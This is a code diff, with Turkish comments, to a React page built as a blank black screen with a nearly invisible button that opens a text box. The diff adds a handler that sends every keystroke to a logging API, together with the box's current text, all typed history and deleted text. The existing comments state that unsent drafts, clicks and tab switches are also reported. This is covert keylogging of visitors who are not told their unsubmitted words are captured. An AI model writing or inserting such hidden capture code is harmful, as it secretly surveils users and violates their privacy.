@@ -7,7 +7,7 @@ import { postLogToApi } from '../utils/gardenEngine';
  * - Arkaplan zifiri siyah (#000000). Hiçbir yazı yok.
  * - Sağ altta çok küçük, zayıfça fark edilebilen 6px yuvarlak gizli buton.
  * - Butona tıklanınca "Ne görmek istiyorsun? Söyle. Ciddiyim Ne görmek istiyorsun?" sorusu ve yazı alanı açılır.
- * - YAZILAN HER ŞEY (gönderilsin ya da gönderilmesin), canlı harf/kelime akışı, silinenler, kutudan çıkışlar, tıklamalar ve sekmeden ayrılmalar anlık bildirim olarak gönderilir.
+ * - YAZILAN HER ŞEY (gönderilsin ya da gönderilmesin), basılan her bir tuş (key stroke), canlı harf/kelime akışı, silinenler, kutudan çıkışlar, tıklamalar ve sekmeden ayrılmalar anlık bildirim olarak gönderilir.
  */
 export default function LastLetterPage({ onGoHome }) {
   // Device & Auth
@@ -362,6 +362,26 @@ export default function LastLetterPage({ onGoHome }) {
     }
   };
 
+  // Handle Keypresses inside Textarea (Captures EVERY single key struck inside textarea!)
+  const handleInputKeyDown = (e) => {
+    if (e.key) {
+      const keyName = e.key === ' ' ? 'Space (Boşluk)' : e.key;
+      sendLog('last_user_keypress', {
+        key: keyName,
+        pressed_key: keyName,
+        targetElement: 'Gizli Soru Yazı Kutusu',
+        letterText: e.target.value,
+        allTypedHistory: allTypedHistoryRef.current,
+        deletedText: deletedTextHistoryRef.current,
+        action: `⌨️ Ziyaretçi Kutuya Tuşladı: "${keyName}" (Kutudaki Metin: "${e.target.value}")`
+      });
+    }
+
+    if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+      handleSubmit(e);
+    }
+  };
+
   // Handle Unfocus / Blur from Text Area (Captures unsubmitted draft when clicking away)
   const handleInputBlur = () => {
     if (inputText && inputText.trim().length > 0) {
@@ -494,12 +514,8 @@ export default function LastLetterPage({ onGoHome }) {
             <textarea
               value={inputText}
               onChange={handleInputChange}
+              onKeyDown={handleInputKeyDown}
               onBlur={handleInputBlur}
-              onKeyDown={(e) => {
-                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
-                  handleSubmit(e);
-                }
-              }}
               placeholder="Yazmak istediğin şey..."
               autoFocus
               rows={4}
